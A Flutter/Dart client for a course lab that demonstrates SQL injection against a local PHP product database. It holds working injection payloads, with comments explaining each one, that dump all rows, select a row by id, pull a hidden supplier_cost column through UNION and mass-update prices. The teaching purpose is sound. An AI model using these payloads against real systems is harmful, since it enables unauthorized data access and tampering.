import 'package:flutter/material.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;

// Backend URL. This is an actual LAN IP, so it works from a real device,
// an emulator, or the desktop/web build as long as they're on the same
// network as the machine serving lab_sec_backend.
const String baseUrl = "http://10.40.60.63/lab_sec_backend";

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'TP1 - SQLi Demo',
      theme: ThemeData(primarySwatch: Colors.indigo, useMaterial3: true),
      home: const HomeScreen(),
    );
  }
}

class HomeScreen extends StatelessWidget {
  const HomeScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('TP1 - Product DB (SQLi demo)')),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            ElevatedButton(
              onPressed: () => Navigator.push(context,
                  MaterialPageRoute(builder: (_) => const SearchScreen())),
              child: const Text('Part 1/3/4 - Search products'),
            ),
            const SizedBox(height: 16),
            ElevatedButton(
              onPressed: () => Navigator.push(context,
                  MaterialPageRoute(builder: (_) => const UpdateScreen())),
              child: const Text('Part 2 - Update price'),
            ),
          ],
        ),
      ),
    );
  }
}

// ---------------- Part 1 / 3 / 4: Search screen ----------------

class SearchScreen extends StatefulWidget {
  const SearchScreen({super.key});

  @override
  State<SearchScreen> createState() => _SearchScreenState();
}

class _SearchScreenState extends State<SearchScreen> {
  final _controller = TextEditingController();
  List<dynamic> _results = [];
  String? _error;
  bool _loading = false;

  // Part 1 payload: always-true OR condition that dumps every row.
  static const String _sqliPayload = "' OR '1'='1";

  // Part 3 payload: OR condition narrowed to a specific id, with the
  // trailing "-- -" commenting out the rest of the original query
  // (the closing quote and LIMIT) so only id=2 is returned.
  //
  // This matches the course example exactly because search.php's
  // query now uses "name = '$q'" (exact match) instead of
  // "name LIKE '%$q%'". With an exact match, the empty name = ''
  // half is false for every real product, so OR id=2 is the only
  // thing that can make a row match.
  static const String _idPayload = "' OR id=2 -- -";

  // Part 4 payload: UNION injection that swaps the price column for
  // supplier_cost. Must select exactly 3 columns to match the base
  // query (id, name, price), or MySQL rejects the UNION. The '  closes
  // the name string so the original WHERE half matches nothing, and
  // the trailing "-- -" comments out the rest of the original query,
  // so only the UNIONed rows (with supplier_cost standing in for
  // price) come back.
  static const String _unionPayload =
      "' UNION SELECT id, name, supplier_cost FROM products -- -";

  void _fillPayload() {
    setState(() {
      _controller.text = _sqliPayload;
      _error = null;
    });
  }

  void _fillIdPayload() {
    setState(() {
      _controller.text = _idPayload;
      _error = null;
    });
  }

  void _fillUnionPayload() {
    setState(() {
      _controller.text = _unionPayload;
      _error = null;
    });
  }

  Future<void> _search() async {
    // Require a non-empty term so an accidental empty search doesn't
    // look like it's "leaking" the whole table — that's just LIKE '%%'
    // matching everything, not the injection the lab is about.
    if (_controller.text.trim().isEmpty) {
      setState(() {
        _results = [];
        _error = 'Enter a search term (or tap "Fill SQLi payload").';
      });
      return;
    }

    setState(() {
      _loading = true;
      _error = null;
    });
    try {
      final uri = Uri.parse(
          "$baseUrl/search.php?q=${Uri.encodeQueryComponent(_controller.text)}");
      final res = await http.get(uri);
      final body = jsonDecode(res.body);
      if (res.statusCode == 200 && body is List) {
        setState(() => _results = body);
      } else {
        setState(() => _error = body['error']?.toString() ?? 'Unknown error');
      }
    } catch (e) {
      setState(() => _error = e.toString());
    } finally {
      setState(() => _loading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Search products')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            TextField(
              controller: _controller,
              decoration: const InputDecoration(
                labelText: 'Search term (try an injection payload)',
                border: OutlineInputBorder(),
              ),
            ),
            const SizedBox(height: 8),
            Wrap(
              alignment: WrapAlignment.center,
              spacing: 12,
              runSpacing: 8,
              children: [
                ElevatedButton(
                  onPressed: _loading ? null : _search,
                  child: _loading
                      ? const SizedBox(
                      height: 16, width: 16,
                      child: CircularProgressIndicator(strokeWidth: 2))
                      : const Text('Search'),
                ),
                OutlinedButton(
                  onPressed: _loading ? null : _fillPayload,
                  child: const Text('Fill SQLi payload (dump all)'),
                ),
                OutlinedButton(
                  onPressed: _loading ? null : _fillIdPayload,
                  child: const Text('Fill SQLi payload (id=2)'),
                ),
                OutlinedButton(
                  onPressed: _loading ? null : _fillUnionPayload,
                  child: const Text('Fill SQLi payload (UNION supplier_cost)'),
                ),
              ],
            ),
            if (_error != null)
              Padding(
                padding: const EdgeInsets.only(top: 8),
                child: Text(_error!, style: const TextStyle(color: Colors.red)),
              ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.builder(
                itemCount: _results.length,
                itemBuilder: (context, i) {
                  final p = _results[i];
                  return ListTile(
                    title: Text(p['name']?.toString() ?? ''),
                    subtitle: Text('id: ${p['id']}'),
                    trailing: Text('\$${p['price']}'),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ---------------- Part 2: Update price screen ----------------

class UpdateScreen extends StatefulWidget {
  const UpdateScreen({super.key});

  @override
  State<UpdateScreen> createState() => _UpdateScreenState();
}

class _UpdateScreenState extends State<UpdateScreen> {
  final _idController = TextEditingController();
  final _priceController = TextEditingController();
  String? _message;
  bool _loading = false;

  // Part 2 payload: always-true WHERE condition that updates every row.
  static const String _idPayload = "0 OR 1=1";
  static const String _pricePayload = "1";

  void _fillPayload() {
    setState(() {
      _idController.text = _idPayload;
      _priceController.text = _pricePayload;
      _message = null;
    });
  }

  Future<void> _update() async {
    setState(() {
      _loading = true;
      _message = null;
    });
    try {
      final res = await http.post(
        Uri.parse("$baseUrl/update.php"),
        body: {
          'id': _idController.text,
          'price': _priceController.text,
        },
      );
      final body = jsonDecode(res.body);
      setState(() {
        _message = body['success'] == true
            ? 'Updated ${body['affected_rows']} row(s).'
            : 'Error: ${body['error']}';
      });
    } catch (e) {
      setState(() => _message = e.toString());
    } finally {
      setState(() => _loading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Update price')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            TextField(
              controller: _idController,
              decoration: const InputDecoration(
                labelText: 'Product id (try an injection payload)',
                border: OutlineInputBorder(),
              ),
            ),
            const SizedBox(height: 8),
            TextField(
              controller: _priceController,
              decoration: const InputDecoration(
                labelText: 'New price',
                border: OutlineInputBorder(),
              ),
            ),
            const SizedBox(height: 8),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                ElevatedButton(
                  onPressed: _loading ? null : _update,
                  child: _loading
                      ? const SizedBox(
                      height: 16, width: 16,
                      child: CircularProgressIndicator(strokeWidth: 2))
                      : const Text('Update'),
                ),
                const SizedBox(width: 12),
                OutlinedButton(
                  onPressed: _loading ? null : _fillPayload,
                  child: const Text('Fill SQLi payload'),
                ),
              ],
            ),
            if (_message != null)
              Padding(
                padding: const EdgeInsets.only(top: 12),
                child: Text(_message!),
              ),
          ],
        ),
      ),
    );
  }
}